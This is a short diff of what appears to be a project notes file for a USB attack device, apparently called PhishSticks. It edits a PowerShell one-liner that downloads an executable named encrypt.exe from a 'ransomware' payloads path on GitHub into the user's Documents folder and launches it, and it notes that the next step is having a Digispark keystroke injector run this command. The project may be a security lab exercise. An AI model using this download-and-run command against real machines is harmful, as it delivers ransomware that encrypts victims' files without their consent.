@@ -86,6 +86,6 @@ TO DO:
 
 Powershell command to download the exe to users Documents folder and start it after downloading has finished:
 ```Powershell
-Invoke-WebRequest -OutFile "$env:UserProfile\Documents\test.exe" -Uri "https://github.com/therealhalonen/PhishSticks/raw/master/payloads/ransomware/ransom_app/encrypt.exe";Start-Process $env:UserProfile/Documents/test.exe -WorkingDirectory $env:UserProfile/Documents
+Invoke-WebRequest -OutFile "$env:UserProfile\Documents\malware.exe" -Uri "https://github.com/therealhalonen/PhishSticks/raw/master/payloads/ransomware/ransom_app/encrypt.exe";Start-Process $env:UserProfile/Documents/malware.exe -WorkingDir $env:UserProfile/Documents
 ```
 Next thing to do is to make Digispark execute the above command
